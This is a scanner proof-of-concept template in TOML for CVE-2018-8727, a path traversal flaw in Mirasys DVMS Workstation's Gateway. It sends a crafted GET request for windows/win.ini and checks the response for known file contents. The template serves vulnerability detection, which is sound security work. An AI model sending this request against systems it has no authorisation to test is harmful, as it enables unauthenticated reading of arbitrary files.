[info]
author = "ave"
description = "Mirasys DVMS Workstation 5.12.6及更早版本的Gateway组件存在路径遍历漏洞，未经身份认证的远程攻击者可通过Web Client webserver发送包含../序列的特制HTTP请求遍历文件系统读取任意文件。"
id = "POC-AVE-2018-0215"
name = "Mirasys DVMS Workstation Gateway 路径遍历漏洞 PoC"
severity = "high"
tags = ["ave-2018-0215"]
vuln_id = [
    "CVE-2018-8727",
    "AVE-2018-0215",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}//////////windows/win.ini"
protocol = "http"

[[poc.requests.matchers]]
condition = "and"
expect = true
part = "body"
type = "word"
words = [
    "bit app support",
    "fonts",
    "extensions",
]
